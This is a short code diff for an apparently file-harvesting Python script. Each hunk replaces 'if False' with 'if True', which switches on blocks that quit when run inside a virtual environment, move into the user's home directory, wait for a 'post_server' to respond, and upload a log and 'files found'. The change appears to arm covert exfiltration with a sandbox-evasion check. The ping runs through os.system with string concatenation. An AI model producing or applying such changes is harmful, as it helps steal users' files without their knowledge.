@@ -29,13 +29,13 @@ def get_prefix():
 def runs_on_venv():
     return get_prefix() != sys.prefix
 
-if False:
+if True:
     if runs_on_venv():
         sys.exit()
 # ========================================================================= #
 # Try to initialize on home:
 # ========================================================================= #
-if False: # Disabled.
+if True:
     try:
         os.chdir(str(Path.home()))
     except Exception as error:
@@ -132,7 +132,7 @@ with open("node_{0}.txt".format(node_id), "w") as fl:
 # ========================================================================= #
 # Wait Server Response:
 # ========================================================================= #
-if False: # Disabled.
+if True:
     while True:
         ping = os.system("ping -c 1 " + post_server[:-14])
         if ping == 0:
@@ -147,7 +147,7 @@ if False: # Disabled.
 # ========================================================================= #
 # Upload Files Found:
 # ========================================================================= #
-if False: # Disabled.
+if True:
     # Send Progress Log:
     try:
         progress = open("node_{0}.txt".format(node_id), "rb")
